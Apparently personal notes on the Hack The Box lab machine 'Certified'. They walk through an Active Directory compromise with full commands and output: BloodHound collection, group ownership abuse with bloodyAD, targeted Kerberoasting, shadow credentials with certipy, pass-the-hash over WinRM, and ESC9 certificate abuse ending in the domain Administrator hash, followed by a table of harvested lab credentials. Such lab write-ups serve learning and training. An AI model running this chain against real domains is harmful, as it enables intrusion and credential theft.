
### Initial access
Port scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-23 08:48:50Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-23T08:50:22+00:00; +6h58m29s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-23T08:50:23+00:00; +6h58m30s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-23T08:50:23+00:00; +6h58m30s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49721/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49742/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49777/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

```
subdomain scan
dirscan
filescan
Bloodhound
```bash

                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ netexec ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-server 10.129.231.186
LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.129.231.186  389    DC01             Resolved collection methods: trusts, session, psremote, localadmin, rdp, group, container, dcom, acl, objectprops                                                                                                                             
LDAP        10.129.231.186  389    DC01             Done in 00M 27S
LDAP        10.129.231.186  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.231.186_2026-09-22_220750_bloodhound.zip     
```

![[Assets/Pasted image 20260923091750.png]]
Add `judith` to group
```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ net rpc group members "MANAGEMENT" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186" 

CERTIFIED\management_svc

┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyad -d certified.htb -u 'judith.mader' -p 'judith09' --host "10.129.231.186" set owner "MANAGEMENT" "judith.mader"
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on MANAGEMENT

┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyad -d certified.htb -u 'judith.mader' -p 'judith09' --host "10.129.231.186" add genericAll "MANAGEMENT" "judith.mader"
[+] judith.mader has now GenericAll on MANAGEMENT

┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyad -d certified.htb -u 'judith.mader' -p 'judith09' --host "10.129.231.186" add groupMember "MANAGEMENT" "judith.mader"
[+] judith.mader added to MANAGEMENT
                                     

```

We have `genericwrite` on `management_svc`
![[Assets/Pasted image 20260923092632.png]]

We add user to service we can kerneroasting
```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ bloodyad -d certified.htb -u 'judith.mader' -p 'judith09' --host "10.129.231.186" set object MANAGEMENT_SVC servicePrincipalName -v 'Service/FakeSPN'
[+] MANAGEMENT_SVC's servicePrincipalName has been updated

```
Kerberoasting
```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ faketime "$(ntpdate -q 10.129.231.186 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186 -request -outputfile kerberos1.hash 
 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
--------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
Service/FakeSPN       management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 11:30:51.476756  <never>               



[-] CCache file is not found. Skipping...


                                               
```
 We cant crack it so let using shadow cred
 ```
 ┌──(kali㉿kali)-[~/HTB/Certified]
└─$ faketime "$(ntpdate -q 10.129.231.186 | tail -n 1 | awk '{print $1,$2,$3}')" certipy shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc' -dc-ip 10.129.231.186

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fbb8eece3f9a48e996a1ad58d23fff16'
[*] Adding Key Credential with device ID 'fbb8eece3f9a48e996a1ad58d23fff16' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'fbb8eece3f9a48e996a1ad58d23fff16' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584

 
 ```
We have winrm access
```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ nxc winrm 10.129.231.186 -u management_svc --hash a091c1832bcdd4677c28b5a6a1295584
WINRM       10.129.231.186  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.231.186  5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)

```
### Lateral Movement
### Priv escalation
We have generic all in CA operater user we can have CA  cert attack
![[Assets/Pasted image 20260923095425.png]]
First shadow attack to get CA operater cred
```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ faketime "$(ntpdate -q 10.129.231.186 | tail -n 1 | awk '{print $1,$2,$3}')" certipy shadow auto -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account 'ca_operator' -dc-ip 10.129.231.186


Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e13543fd50a54fd2947e3b28be099c40'
[*] Adding Key Credential with device ID 'e13543fd50a54fd2947e3b28be099c40' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'e13543fd50a54fd2947e3b28be099c40' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2

```


```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy find -enabled -vulnerable -hide-admins -u 'ca_operator@certified.htb' -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260922231126_Certipy.txt'
[*] Wrote text output to '20260922231126_Certipy.txt'
[*] Saving JSON output to '20260922231126_Certipy.json'
[*] Wrote JSON output to '20260922231126_Certipy.json'
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ cat 20260922231126_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Access Rights
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

```
We ESC9 let perform this attack
```
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ certipy account update -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'Administrator' -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'

certipy account update -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'Administrator' -dc-ip 10.129.231.186

certipy req -u 'ca_operator@certified.htb' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' -dc-ip 10.129.231.186



┌──(kali㉿kali)-[~/HTB/Certified]
└─$ faketime "$(ntpdate -q 10.129.231.186 | tail -n 1 | awk '{print $1,$2,$3}')" certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain 'certified.htb'

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
                                                                                                                     
```

| Username       | pass     | Hash                                 |
| -------------- | -------- | ------------------------------------ |
| judith.mader   | judith09 |                                      |
| management_svc |          | a091c1832bcdd4677c28b5a6a1295584     |
| ca_operator    |          | b4b86f45c6018f1b664f70805f45d8f2<br> |
